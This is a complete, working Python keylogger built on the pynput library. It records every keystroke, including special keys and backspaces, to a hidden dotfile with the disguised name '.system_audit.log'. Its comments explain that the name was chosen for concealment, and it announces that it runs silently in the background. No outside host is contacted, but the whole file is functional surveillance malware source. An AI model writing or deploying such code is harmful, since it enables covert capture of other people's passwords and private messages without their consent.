from pynput import keyboard

# We start the filename with a dot (.) to make it a hidden file on macOS/Linux
LOG_FILE = ".system_audit.log"

def write_to_file(text):
    # 'a' means append. It adds to the end of the file rather than overwriting it.
    with open(LOG_FILE, "a") as file:
        file.write(text)

def on_press(key):
    try:
        # If it's a normal letter or number, write it directly
        write_to_file(key.char)
    except AttributeError:
        # Handle special keys so they read like normal text
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n") # Creates a new line
        elif key == keyboard.Key.tab:
            write_to_file("\t")
        elif key == keyboard.Key.backspace:
            write_to_file("[BACKSPACE]") # So we know they deleted something
        else:
            # For things like Shift, Ctrl, Cmd, we just put them in brackets
            write_to_file(f" [{key}] ")

def on_release(key):
    # Our emergency kill switch
    if key == keyboard.Key.esc:
        print("Stopping the listener...")
        return False

print("Keylogger running silently in the background. Press 'ESC' to stop.")

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()